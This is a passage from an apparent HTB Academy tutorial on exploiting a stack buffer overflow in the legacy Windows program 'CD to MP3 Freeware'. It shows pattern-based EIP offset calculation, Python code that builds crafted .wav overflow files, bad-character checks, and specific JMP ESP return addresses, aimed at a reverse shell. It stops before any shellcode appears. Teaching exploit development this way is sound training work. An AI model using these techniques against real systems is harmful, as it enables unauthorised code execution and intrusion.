+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ /usr</span><span class="hljs-regexp">/bin/msf</span>-pattern_create -l <span class="hljs-number">5000</span>
+
+Aa0Aa1Aa2...SNIP...<span class="hljs-number">3</span>Gk4Gk5Gk
+</code></pre>
+<p>We can now feed this buffer to our program as a <code>.wav</code> file. However, it's always easier to do everything in Windows to avoid jumping between two VMs. So, let's see how we can get the same pattern with <code>ERC</code>.</p>
+<p>If we use the <code>ERC --help</code> command, we see the following guidance:</p>
+<p>  Controlling EIP</p>
+<pre><code class="lang-cmd-session"><span class="hljs-comment">--Pattern</span>
+Generates <span class="hljs-keyword">a</span> non repeating pattern. A pattern <span class="hljs-keyword">of</span> pure ASCII <span class="hljs-keyword">characters</span> can be generated up <span class="hljs-built_in">to</span> <span class="hljs-number">20277</span> <span class="hljs-keyword">and</span> up <span class="hljs-built_in">to</span>  
+<span class="hljs-number">66923</span> <span class="hljs-keyword">if</span> special <span class="hljs-keyword">characters</span> are used. The <span class="hljs-built_in">offset</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> particular <span class="hljs-keyword">string</span> can be found inside <span class="hljs-keyword">the</span> pattern <span class="hljs-keyword">by</span> 
+providing <span class="hljs-keyword">a</span> search <span class="hljs-keyword">string</span> (must be <span class="hljs-keyword">at</span> least <span class="hljs-number">3</span> <span class="hljs-keyword">chars</span> <span class="hljs-keyword">long</span>).
+    Pattern <span class="hljs-built_in">create</span>: ERC <span class="hljs-comment">--pattern &lt;create | c&gt; &lt;length&gt;</span>
+    Pattern <span class="hljs-built_in">offset</span>: ERC <span class="hljs-comment">--pattern &lt;offset | o&gt; &lt;search string&gt;</span>
+</code></pre>
+<p>As we can see, we can use <code>ERC --pattern c 5000</code> to get our pattern. So, let's use this command and see what we get: <img src="storage\modules\89\win32bof_erc_pattern_create_1.jpg" alt="Debugger interface displaying ASCII data with hexadecimal values."></p>
+<p>This pattern is the same pattern we got with the <code>msf-pattern_create</code> tool, so we can use either. We can now go to our Desktop to find the output saved to a file called <code>Pattern_Create_1.txt</code>. Now we can save the pattern in a <code>.wav</code> file and load it into our program. However, to do that, we'll start building our exploit, which we will keep developing and using for other parts of the buffer overflow exploitation process.</p>
+<hr>
+<h3 id="writing-our-exploit">Writing Our Exploit</h3>
+<p>We will write our exploit in Python3 since it contains built-in libraries to help us in this process, like <code>struct</code> and <code>requests</code>. We will also write each part of the exploitation process under its own function so that we don't have to jump between different exploit scripts and just call a different function for each part of the process.</p>
+<p>We can start by creating a new function with <code>def eip_offset():</code>, and then create our <code>payload</code> variable as a <code>bytes</code> object and paste between the parenthesis the <code>Ascii:</code> output from <code>Pattern_Create_1.txt</code>. So, we can click on the Windows Search bar at the bottom and write <code>IDLE</code>, which would open the Python3 editor, and then click <code>ctrl+N</code> to start writing a new python script where we can start writing our code. Our initial code should look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">eip_offset</span><span class="hljs-params">()</span></span>:
+    payload = bytes(<span class="hljs-string">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"</span>
+                    ...SNIP...
+                    <span class="hljs-string">"Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"</span>,
+                    <span class="hljs-string">"utf-8"</span>)
+</code></pre>
+<p>Next, under the same <code>eip_offset()</code> function, we will write <code>payload</code> to a file called <code>pattern.wav</code>, by adding the following lines:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'pattern.wav'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+        f.<span class="hljs-built_in">write</span>(payload)
+</code></pre>
+<p>Note how we are always using bytes for our data, and use <code>'wb'</code> to write our pattern in bytes. This is because we should create our payload as it will be processed by the program, which in a buffer overflow exercise is in bytes, since it will be loaded into the stack as machine code in bytes.</p>
+<p>Finally, we should call our <code>eip_offset()</code> function by adding the following line at the end. Otherwise, the function will not get run:</p>
+<p>Code: python3</p>
+<pre><code class="lang-python3"><span class="hljs-function"><span class="hljs-title">eip_offset</span><span class="hljs-params">()</span></span>
+</code></pre>
+<p>Now, we can save this exploit to our Desktop as <code>win32bof_exploit.py</code>, and run it. To run it while still in our <code>IDLE</code>, we can click on <code>Run &gt; Run Module</code>, or click <code>F5</code>: <img src="storage\modules\89\win32bof_python_idle_exploit_2.jpg" alt="IDLE Shell 3.9.4 showing restart of win32bof\_exploit.py script."></p>
+<p>Once we do, we will see the new file <code>pattern.wav</code> on our Desktop.</p>
+<hr>
+<h3 id="calculating-eip-offset">Calculating EIP Offset</h3>
+<p>Now that we have our pattern saved into a <code>.wav</code> file, we can load it into our program. We should ensure that the program is running and is attached to <code>x32dbg</code>, and then we can open our file as we did in the previous section. We can click on the <code>restart</code> button in <code>x32dbg</code> to restart our program if our previous input had crashed it:\
+<img src="storage\modules\89\win32bof_x32dbg_restart.jpg" alt="Toolbar with folder, refresh, stop, play, pause, download, and reset icons."></p>
+<p>Once we do, we should see that our program crashes due to the long input. Most importantly, we should see that the <code>EIP</code> register got overwritten with part of our unique pattern: <img src="storage\modules\89\win32bof_pattern_eip.jpg" alt="Registers with EAX as 00000000, EBX as 68463967, and ESP pointing to a string of characters."></p>
+<p>Now we can use the value of <code>EIP</code> to calculate the offset. We can once again do it in our <code>PwnBox</code> with <code>msf-pattern_offset</code> (the counterpart of <code>msf-pattern_create</code>), by using the hex value in <code>EIP</code>, as follows:</p>
+<p>  Controlling EIP</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ /usr</span><span class="hljs-regexp">/bin/msf</span>-pattern_offset -q <span class="hljs-number">31684630</span>
+
+[*] Exact match at offset <span class="hljs-number">4112</span>
+</code></pre>
+<p>As we can see, it tells us that our <code>EIP</code> offset is <code>4112</code> bytes. We can also stay in the <code>Windows</code> VM and use <code>ERC</code> to calculate the same offset. First, we should get the ASCII value of the hex bytes found in <code>EIP</code>, by right-clicking on <code>EIP</code> and selecting <code>Modify Value</code>, or by clicking on <code>EIP</code> and then clicking Enter. Once we do, we will see various representations of the <code>EIP</code> value, with ASCII being the last one: <img src="storage\modules\89\win32bof_pattern_eip_ascii.jpg" alt="Registers with EAX as 00000000, EBX as 68463967, and an edit window displaying expression 31684630 and ASCII 1hF0."></p>
+<p>The hex value found in <code>EIP</code> represents the string <code>1hF0</code>. Now, we can use <code>ERC --pattern o 1hF0</code> to get the pattern offset: <img src="storage\modules\89\win32bof_pattern_offset.jpg" alt="Text showing 'ERC --Pattern' with a message: 'Value found reversed at position 4112 in pattern.' Below, a command: 'ERC --pattern o 1hF0' is displayed."></p>
+<p>We once again get <code>4112</code> bytes as our <code>EIP</code> offset.</p>
+<p>The <code>ERC</code> plugin can also find the offset automatically with the <code>ERC --findNRP</code> command, though it must be noted that this takes significantly longer depending on the size of RAM:</p>
+<p><img src="storage\modules\89\win32bof_pattern_offset_findnrp.jpg" alt="Registers EDI, ESI, EBX, ESP, EBP, and EIP overwritten with patterns at various positions in thread 8104. Command: ERC --findNRP."></p>
+<p>As we can see, it found the offset based on patterns found in various registers, each of which can be helpful in specific types of binary exploitation. For us, we are only interested in the <code>EIP</code> register, which it says has an offset of <code>4112</code> bytes, as we have seen previously.</p>
+<hr>
+<h3 id="controlling-eip">Controlling EIP</h3>
+<p>Our final step is to ensure we can control what value goes into <code>EIP</code>. Knowing the offset, we know exactly how far our <code>EIP</code> is from the start of the buffer. So, if we send <code>4112</code> bytes, the next 4 bytes would be the ones that fill <code>EIP</code>.</p>
+<p>Let's add another function, <code>eip_control()</code>, to our <code>win32bof_exploit.py</code> and create an <code>offset</code> variable with the offset we found. Then, we'll create a <code>buffer</code> variable with a string of <code>A</code> bytes as long as our offset to fill the buffer space, and an <code>eip</code> variable with the value we want <code>EIP</code> to be, which we will use as <code>4</code> bytes of <code>B</code>. Finally, we'll add both to a <code>payload</code> variable and write it to <code>control.wav</code>, as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def eip_control():
+    <span class="hljs-built_in">offset</span> = <span class="hljs-number">4112</span>
+    buffer = b<span class="hljs-string">"A"</span>*<span class="hljs-built_in">offset</span>
+    eip = b<span class="hljs-string">"B"</span>*<span class="hljs-number">4</span>
+    payload = buffer + eip
+
+    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'control.wav'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+        f.<span class="hljs-built_in">write</span>(payload)
+
+eip_control()
+</code></pre>
+<p>Splitting our payload into variables allows us to precisely control each part of the buffer and easily adapt it as we work on our exploit.</p>
+<p>Note how the last line now calls our new function <code>eip_control()</code>. In the future, we can simply change this line to execute the function we need. Since we are adding functions as we proceed with this module, our functions will be sorted in the order we need them.</p>
+<p>We can now run our exploit to generate <code>control.wav</code> and load it into our program after restarting it in <code>x32dbg</code>. When our program crashes, we see the hex value <code>42424242</code>, which is the ASCII representation of <code>BBBB</code>:</p>
+<p><img src="storage\modules\89\win32bof_control_eip.jpg" alt="Registers EAX to EDI with values, EIP highlighted as 42424242."></p>
+<p>We see that we can control the exact value that goes into <code>EIP</code>, and we can swap the <code>B</code>'s in our exploit with the address we want, and the program should call it.</p>
+<p>Before we choose an address to call, we should first check if we should avoid any specific characters in our input, which we will discuss in the next section.</p>
+<hr>
+<h2 id="identifying-bad-characters">Identifying Bad Characters</h2>
+<hr>
+<p>Before we start to utilize the fact that we can control the <code>EIP</code> and subvert the program's execution flow, we need to determine any characters we should avoid using in our payload.</p>
+<p>As we are attacking an input parameter (an opened file in this case), the program is expected to process our input. So, depending on the processing each program executes on our input, certain characters may tell the program that it has reached the end of the input. This may happen even though it may not have reached the end of the input yet.</p>
+<p>For example, a very common bad character is a null byte <code>0x00</code>, used in Assembly as a string terminator, which tells the processor the string has ended. So, if our payload included a null byte, the program may stop processing our shellcode, thinking it has reached the end of it. This will cause our payload not to execute correctly, and our attack would fail. More examples are <code>0x0a</code> and <code>0x0d</code>, which are the new line  and carriage return , respectively. If we were exploiting a buffer overflow in a string input that is expected to be a single line (like a license key), these characters would probably end our input prematurely, which would also cause our payload to fail.</p>
+<hr>
+<h3 id="generating-all-characters">Generating All Characters</h3>
+<p>To identify bad characters, we have to send all characters after filling the <code>EIP</code> address, which is after <code>4112</code> + <code>4</code> bytes. We then check whether any of the characters got removed by the program or if our input got truncated prematurely after a specific character.</p>
+<p>To do this, we would need two files:</p>
+<ol>
+<li>A <code>.wav</code> file with all characters to load into the program</li>
+<li>A <code>.bin</code> file to compare with our input in memory</li>
+</ol>
+<p>We can use <code>ERC</code> to generate the <code>.bin</code> file and generate a list of all characters to create our <code>.wav</code> file. To do so, we can use the <code>ERC --bytearray</code> command: <img src="storage\modules\89\win32bof_erc_bytearry.jpg" alt="Byte array from 00 to FF displayed in rows. Command: ERC --bytearray."></p>
+<p>This also creates two files on our Desktop:</p>
+<ul>
+<li><code>ByteArray_1.txt</code>: Which contains the string of all characters we can use in our python exploit</li>
+<li><code>ByteArray_1.bin</code>: Which we can use with <code>ERC</code> later to compare with our input in memory</li>
+</ul>
+<hr>
+<h3 id="updating-our-exploit">Updating our exploit</h3>
+<p>The next step would be to generate a <code>.wav</code> file with the characters string generated by <code>ERC</code>. We will once again write a new function <code>bad_chars()</code>, and use a similar code to the <code>eip_control()</code> function, but will use the characters under <code>C#</code> in <code>ByteArray_1.txt</code>. We will create a new list of bytes <code>all_chars = bytes([])</code>, and paste the characters between the brackets. We will then write to <code>chars.wav</code> the same <code>payload</code> from <code>eip_control()</code>, and add after it <code>all_chars</code>. The final function would look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python">def bad_chars():
+    all_chars = bytes([
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>,
+        ...SNIP...
+        <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>
+    ])
+
+    offset = <span class="hljs-number">4112</span>
+    buffer = b<span class="hljs-string">"A"</span>*offset
+    <span class="hljs-built_in">eip</span> = b<span class="hljs-string">"B"</span>*<span class="hljs-number">4</span>
+    payload = buffer + <span class="hljs-built_in">eip</span> + all_chars
+
+    with open(<span class="hljs-string">'chars.wav'</span>, <span class="hljs-string">'wb'</span>) as f:
+        f.write(payload)
+
+bad_chars()
+</code></pre>
+<p>Note how we added a <code>b</code> before <code>A</code> and <code>B</code> to turn them into bytes</p>
+<p>We can now run our exploit with <code>F5</code> to generate the <code>chars.wav</code> file.</p>
+<hr>
+<h3 id="comparing-our-input">Comparing our Input</h3>
+<p>Now we can restart our program in <code>x32dbg</code> and load <code>chars.wav</code> to it. Once we do, we can start comparing our input in memory and seeing whether any characters are missing. To do so, we can check the Stack pane on the bottom right of <code>x32dbg</code>, which should be aligned exactly at the beginning of our input: <img src="storage\modules\89\win32bof_bytes_stack.jpg" alt="Memory addresses with values, including 00E8FB48 showing C0A83800 and repeated characters."></p>
+<p>We can now manually go through the stack line by line from right to left and ensure that all hex values are present, from <code>0x00</code> to <code>0xff</code>. As this may take a while, and we would entirely rely on our eyes, we may miss a character or two. So, we will once again utilize <code>ERC</code> to make the comparison for us. It will easily compare our input in memory to all characters.</p>
+<p>We must first copy the address of <code>ESP</code> since this is where our input is located. We can do this by right-clicking on it and selecting <code>Copy value</code>, or clicking <code>[Ctrl + C]</code>: <img src="storage\modules\89\win32bof_bytes_esp.jpg" alt="Registers EAX to EDI with values, ESP highlighted as 0014F974."></p>
+<p>Once we have the value of <code>ESP</code>, we can use <code>ERC --compare</code> and give it the <code>ESP</code> address and the location of the <code>.bin</code> file that contains all characters, as follows:</p>
+<p>  Identifying Bad Characters</p>
+<pre><code class="lang-cmd-session">ERC --compare 0014F974 C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\B</span>yteArray_1.bin
+</code></pre>
+<p>What this command will do is compare byte-by-byte both our input in <code>ESP</code> and all characters that we generated earlier in <code>ByteArray_1.bin</code>: <img src="storage\modules\89\win32bof_bytes_compare.jpg" alt="Comparing memory region at 0x14F974 with file bytes, showing differences. Command: ERC --compare 0014F974 c:\Users\htb-student\Desktop\ByteArray\_1.bin."></p>
+<p>As we can see, this places each byte from both locations next to each other to quickly spot any issues. The output we seek is where all bytes from both locations are the same, with no differences whatsoever. However, we see that after the first character, <code>00</code>, all remaining bytes are different. <code>This indicates that 0x00 truncated the remaining input, and hence it should be considered a bad character.</code></p>
+<hr>
+<h3 id="eliminating-bad-characters">Eliminating Bad Characters</h3>
+<p>Now that we have identified the first bad character, we should use <code>--bytearray</code> again to generate a list of all characters without the bad characters, which we can specify with <code>-bytes 0x00,0x0a,0x0d...etc.</code>. So, we will use the following command:</p>
+<p>  Identifying Bad Characters</p>
+<pre><code class="lang-cmd-session"><span class="hljs-symbol">ERC</span> --<span class="hljs-keyword">bytearray </span>-<span class="hljs-keyword">bytes </span><span class="hljs-number">0x00</span>
+</code></pre>
+<p>Now, let's use this command with <code>ERC</code> again to generate the new file and use it to update our exploit:</p>
+<p><img src="storage\modules\89\win32bof_erc_bytearry_2.jpg" alt="Byte array excluding 00, displayed in rows. Command: ERC --bytearray --bytes 0x00."></p>
+<p>As we can see, this time, it said <code>excluding: 00</code>, and the array table does not include <code>00</code> at the beginning. So, let's go to the generated output file <code>ByteArray_2.txt</code>, copy the new bytes under <code>C#</code>, and place them in our exploit, which should now look as follows:</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bad_chars</span><span class="hljs-params">()</span></span>:
+    all_chars = bytes([
+        <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>
+...SNIP...
+</code></pre>
+<p>Note: The <code>chars.wav</code> file may still be held by the debugger, and our python script may not be able to overwrite it. So, restart the program in <code>x32dbg</code> to release the file before running the exploit.</p>
+<p>Once we have our new <code>chars.wav</code> file, we will once again load it in our program and use <code>--compare</code> with the new <code>ByteArray_2.bin</code> file to see whether both inputs match: <img src="storage\modules\89\win32bof_bytes_compare_2.jpg" alt="Comparing memory region at 0x14F974 with file bytes, showing matches. Command: ERC --compare 0014F974 C:\Users\htb-student\Desktop\ByteArray\_2.bin."></p>
+<p>As we can see, this time, both lines match perfectly until <code>0xFF</code>, meaning that there are no more bad characters in our input. If we had identified another bad character, we would repeat the same process as we just did for <code>Eliminating Bad Characters</code> until both lines match perfectly.</p>
+<p>So, now we know that we should avoid using <code>0x00</code> in the <code>EIP</code> address we want to execute or in our shellcode.</p>
+<p>Tip: We would find that the characters <code>0x00</code>, <code>0x0a</code>, <code>0x0d</code> are often found to be bad characters in many programs and many vulnerable functions (as discussed earlier). So, to save time, we can consider these to be bad characters from the beginning, and look for other bad characters.</p>
+<p>Note: The found bad characters in this section may not reflect the real bad characters for our program, as this was just a demonstration of how to identify bad characters. Try to repeat the process to find the real bad characters, if any.</p>
+<hr>
+<h2 id="finding-a-return-instruction">Finding a Return Instruction</h2>
+<hr>
+<p>As we have confirmed that we can control the address stored in <code>EIP</code> when the program executes the return instruction <code>ret</code>, we know that we can subvert the program execution and have it execute any instruction we want by writing the instruction's address to <code>EIP</code>, which would get executed after the return instruction <code>ret</code>.</p>
+<p>But what instructions are at our disposal? And how would a single assembly instruction help us in gaining code execution? This is what we will discuss in this section.</p>
+<hr>
+<h3 id="subverting-program-flow">Subverting Program Flow</h3>
+<p>To successfully subvert the program's execution flow, we must write a working address at <code>EIP</code> that leads to an instruction that will benefit us. Currently, we have only written 4 <code>B</code>'s to <code>EIP</code>, which (obviously) is not a working address, and when the program attempts to go to this address, it will fail, which will lead the entire program to crash.</p>
+<p>To find an address we can use, we must look at all of the instructions used or loaded by our program, pick one of them, and write its address at <code>EIP</code>. In modern systems with Address Space Layout Randomization (ASLR), if we choose an address, it will be useless, as it would change the next time our program runs since it gets randomized. In that case, we would have to follow a method of leaking the current set of addresses in real-time and use it in our exploit. However, we are not dealing with any of these types of protections in this module, so we can assume that the address we pick will not change, and we can safely use it in our program.</p>
+<p>To know what instruction to use, we must first know what we want this address to do. While more advanced binary exploitation methods like <code>ROP</code> rely on utilizing and mapping various local instructions to perform the attack (like sending a reverse shell), we do not have to get this advanced yet, since we are dealing with a program with most memory protections disabled.</p>
+<p>So, we will utilize a method known as <code>Jumping to Stack</code>.</p>
+<hr>
+<h3 id="jumping-to-stack">Jumping to Stack</h3>
+<p>As we already have input into the stack, which we are overflowing with data, we can potentially write instructions that will send us a reverse shell when executed (in the form of machine code/shellcode). Once we write our data to the stack, we can then direct the program execution flow to the stack, such that it starts executing our shellcode, at which point we would receive a reverse shell and gain control over the remote server.</p>
+<p>To direct the execution flow to the stack, we must write an address to <code>EIP</code> to do so. This can be done in two ways:</p>
+<ol>
+<li>Write the <code>ESP</code> address (top of the stack) to <code>EIP</code>, so it starts executing code found at the top stack</li>
+<li>Using a <code>JMP ESP</code> instruction, which directs the execution flow to the stack</li>
+</ol>
+<p>Before we continue, we must note that this method DOES NOT work with modern machines, as we have mentioned previously, and it is considered a legacy method of exploitation.\
+<img src="storage\modules\89\win32bof_stack_meme.png" alt="Grandma with walker, text: 'Just overflow the shellcode on the stack and jump to it.' Young woman replies: 'Sure grandma, let's get you to bed.'"></p>
+<p>Modern systems and programs are compiled with the <code>NX</code> bit on the stack or the <code>DEP</code> memory protection in Windows, which prevents executing any code written on the stack. So, even if we would write the shellcode on the stack, it would not be executable, nor would we find a <code>JMP ESP</code> instruction we can use within the program.</p>
+<p>However, as we mentioned at the beginning of the module, it is still very beneficial to start by learning such techniques, as they form more advanced techniques like <code>SEH</code> or <code>ROP</code>. Once we master this technique, our next step in binary exploitation would be to bypass protections and utilize more advanced methods to gain code execution without needing to write shellcode to the stack.</p>
+<hr>
+<h3 id="using-esp-address">Using ESP Address</h3>
+<p>Let's first try the most basic method of writing the address of the top of the stack <code>ESP</code>. Once we write an address to <code>EIP</code> and the program crashes on the return instruction <code>ret</code>, the debugger would stop at that point, and the <code>ESP</code> address at the point would match the beginning of our shellcode, similarly to how we saw our characters on the stack when looking for bad characters. We can take note of the <code>ESP</code> address at this point, which in this case is <code>0014F974</code>:</p>
+<p><img src="storage\modules\89\win32bof_pattern_eip.jpg" alt="Registers EAX to EDI with values, ESP highlighted as 0014F974, EIP as 31684630."></p>
+<p>Tip: We can also look at the stack on the bottom right pane to find the same details.</p>
+<p>This method may work for this particular program, but it is not a very reliable method on Windows machines. First, the input we are attacking here is an audio file, so we see that all characters are allowed without bad characters. However, in many cases, we may be attacking a string input or a program argument, in which case <code>0x00</code> would be a bad character, and we would not use the address of <code>ESP</code> since it begins with <code>00</code>.</p>
+<p>Another reason is that the address of <code>ESP</code> may not be the same on all machines. So, it may work throughout the debugging and exploit development process but may not be the same address when we fire the exploit at a real target, as it may have a different <code>ESP</code> address, at which point our exploit would fail.</p>
+<p>Nevertheless, let's note this address and continue, and we'll test both methods in the next section.</p>
+<hr>
+<h3 id="using-jmp-esp">Using JMP ESP</h3>
+<p>The more reliable way of executing shellcode loaded on the stack is to find an instruction used by the program that directs the program's execution flow to the stack. We can use several such instructions, but we will be using the most basic one, <code>JMP ESP</code>, that jumps to the top of the stack and continues the execution.</p>
+<p><strong>Locating Modules</strong></p>
+<p>To find this instruction, we must look through executables and libraries loaded by our program. This includes:</p>
+<ol>
+<li>The program's <code>.exe</code> file</li>
+<li>The program's own <code>.dll</code> libraries</li>
+<li>Any Windows <code>.dll</code> libraries used by the program</li>
+</ol>
+<p>To find a list of all loaded files by the program, we can use <code>ERC --ModuleInfo</code>, as follows: <img src="storage\modules\89\win32bof_module_info.jpg" alt="Process 'cdextract' with 62 modules listed, showing base, entry point, size, and security features. Command: ERC --ModuleInfo --NXCompat."></p>
+<p>We find many modules loaded by the program. However, we can skip any files with:</p>
+<ul>
+<li><code>NXCompat</code>: As we are looking for a <code>JMP ESP</code> instruction, so the file should not have stack execution protection.</li>
+<li><code>Rebase</code> or <code>ASLR</code>: Since these protections would cause the addresses to change between runs</li>
+</ul>
+<p>As for <code>OS DLL</code>, if we are running on a newer Windows version like Windows 10, we can expect all OS DLL files to have all memory protections present, so we would not use any of them. If we were attacking an older Windows version like Windows XP, many of the loaded OS DLLs likely have no protections so that we can look for <code>JMP ESP</code> instructions in them as well.</p>
+<p>If we only consider files with <code>False</code> set to all protections, we would get the following list:</p>
+<p>  Finding a Return Instruction</p>
+<pre><code class="lang-cmd-session">------------------------------------------------------------------------------------------------------------------------ 
+ Base          | Entry point   | <span class="hljs-built_in">Size</span>      | Rebase   | SafeSEH  | ASLR    | NXCompat | OS DLL  | Version, <span class="hljs-built_in">Name</span>, <span class="hljs-built_in">and</span> Path 
+------------------------------------------------------------------------------------------------------------------------ 
+<span class="hljs-number">0</span>x400000        <span class="hljs-number">0</span>xd88fc         <span class="hljs-number">0</span>x11c000    <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      C:\Program Files\CD <span class="hljs-keyword">to</span> MP3 Freeware\cdextract.exe 
+<span class="hljs-number">0</span>x672c0000      <span class="hljs-number">0</span>x1000          <span class="hljs-number">0</span>x13000     <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-number">1.0</span>rc1;AKRip32;C:\Program Files\CD <span class="hljs-keyword">to</span> MP3 Freeware\akrip32.dll 
+<span class="hljs-number">0</span>x10000000      <span class="hljs-number">0</span>xa3e0          <span class="hljs-number">0</span>xc000      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      <span class="hljs-literal">False</span>      C:\Program Files\CD <span class="hljs-keyword">to</span> MP3 Freeware\ogg.dll
+</code></pre>
+<p>As we can see, all of the files belong to the program itself, which indicates that the program and all of its files were compiled without any memory protection, which means we may find <code>JMP ESP</code> instructions in them. <code>The best option is to use an instruction from the program itself, as we'll be sure that this address will exist regardless of the version of Windows running the program</code>.</p>
+<p><strong>Searching for JMP ESP</strong></p>
+<p>Now that we have a list of loaded files that may include the instruction we are looking for, we can search them for usable instructions. To access any of these files, we can go to the <code>Symbols</code> tab by clicking on it or hitting <code>alt+e</code>:</p>
+<p><img src="storage\modules\89\win32bof_module_symbols.jpg" alt="List of modules with base addresses, including cdextract.exe, all unloaded."></p>
+<p>We can start with <code>cdextract.exe</code> and double-click it to open view and search its instructions. To search for the <code>JMP ESP</code> instruction within the instructions of this file, we can click <code>ctrl+f</code>, which allows us to search for any instruction within the opened file <code>cdextract.exe</code>: <img src="storage\modules\89\win32bof_find_command.jpg" alt="Find Command dialog with 'jmp esp' entered."></p>
+<p>We can enter <code>jmp esp</code>, and it should show us if this file contains any of the instructions we searched for: <img src="storage\modules\89\win32bof_find_jmp_esp.jpg" alt="Disassembly view showing 'jmp esp' at multiple addresses."></p>
+<p>As we can see, we found the following matches:</p>
+<p>Code: shell</p>
+<pre><code class="lang-cmd-shell">Address  Disassembly
+<span class="hljs-number">00419D0B</span> jmp esp
+<span class="hljs-number">00463B91</span> jmp esp
+<span class="hljs-number">00477A8B</span> jmp esp
+<span class="hljs-number">0047E58B</span> jmp esp
+<span class="hljs-number">004979F4</span> jmp esp
+</code></pre>
+<p>Note: We can also search for <code>CALL ESP</code>, which will also jump to the stack.</p>
+<p>As is the case with the address when using the <code>ESP</code> address, <code>we must ensure that the instruction address does not contain any bad characters</code>. Otherwise, our payload would get truncated, and the attack would fail. However, in our case, we do not have any bad characters, so we can choose any of the above addresses.</p>
+<p>We can double-click on any of the results to see the instruction in the main file disassembly and double-check that it is indeed a <code>JMP ESP</code> instruction.</p>
+<p>We can also check the other loaded <code>.dll</code> files to see whether they contain any useful instructions, just in case any of the above did not work correctly. To do so, we can go back to the <code>Symbols</code> tab, double-clicking on the file we want to search, and then do the same process to search for the <code>JMP ESP</code> instruction.</p>
+<p>If we had a large list of loaded modules, we could search through all of them by right-clicking on the main top right <code>CPU</code> pane and selecting <code>Search For&gt; All Modules&gt; Command</code>, then entering <code>jmp esp</code>. However, this may return a large list of results, some of which may not be usable. This is dependent on the protections present for its binary and if it is directly accessible by our program. Because of this, it's best to try to search within individual files first.</p>
+<p><strong>Searching for Patterns</strong></p>
+<p>Another example of a basic command to jump to the stack is <code>PUSH ESP</code> followed by <code>RET</code>. Since we are searching for two instructions, in this case, we should search using the machine code rather than the assembly instructions. We can use <a href="https://defuse.ca/online-x86-assembler.htm">Online Assemblers</a>, or the <code>msf-nasm_shell</code> tool found in <code>PwnBox</code> to convert any assembly instructions to machine code. Both of these take an assembly instruction and give us the corresponding machine code.</p>
+<p>After using one of these, we would find that the machine code for <code>JMP ESP</code> is <code>FFE4</code>, and for <code>PUSH ESP; RET</code> is <code>54C3</code>. Now we can search using this pattern by clicking <code>ctrl+b</code> in the <code>CPU</code> pane and entering the pattern <code>54C3</code>:</p>
+<p><img src="storage\modules\89\win32bof_find_pattern.jpg" alt="Find Pattern dialog with fields for ASCII, UNICODE, UTF-8, and Hex showing '54 C3'."></p>
+<p>Once we do, we would find a few other addresses we can use as well: <img src="storage\modules\89\win32bof_find_pattern_push_esp.jpg" alt="Pattern 54C3 found at addresses 0047D4F5, 0047D4FD, 00483D0E."></p>
+<p>We can double-click any of them and confirm that it is indeed a <code>PUSH ESP</code> instruction followed by a <code>RET</code> instruction:</p>
+<p><img src="storage\modules\89\win32bof_pattern_push_esp.jpg" alt="Disassembly showing 'push esp' at 0047D4F5 and 'ret' at 0047D4F6."></p>
+<hr>
+<h3 id="summary">Summary</h3>
+<p>We have discussed many methods to find an instruction that would execute the shellcode we load on the stack:</p>
+<ol>
+<li>We can use the <code>ESP</code> address</li>
+<li>We can search loaded modules with disabled security for <code>JMP ESP</code> instructions</li>
+<li>We can search for Assembly Instructions or search for machine code patterns</li>
+<li>Any address we pick must not contain any bad characters</li>
+</ol>
+<hr>
+<h2 id="jumping-to-shellcode">Jumping to Shellcode</h2>
+<hr>
+<p>So far in our exercise to identify and exploit a stack-based buffer overflow vulnerability, we have done the following:</p>
+<ol>
+<li>Fuzzed Parameters</li>
+<li>Controlled EIP</li>
+<li>Identified Bad Characters</li>
+<li>Found a Return Instruction</li>
+</ol>
+<p>The final step is to write some shellcode on the stack that gets executed when the Return Addresses we found earlier are executed since we look for addresses of instructions that execute the code written on the top of the stack.</p>
+<hr>
+<h3 id="shellcode-generation">Shellcode Generation</h3>
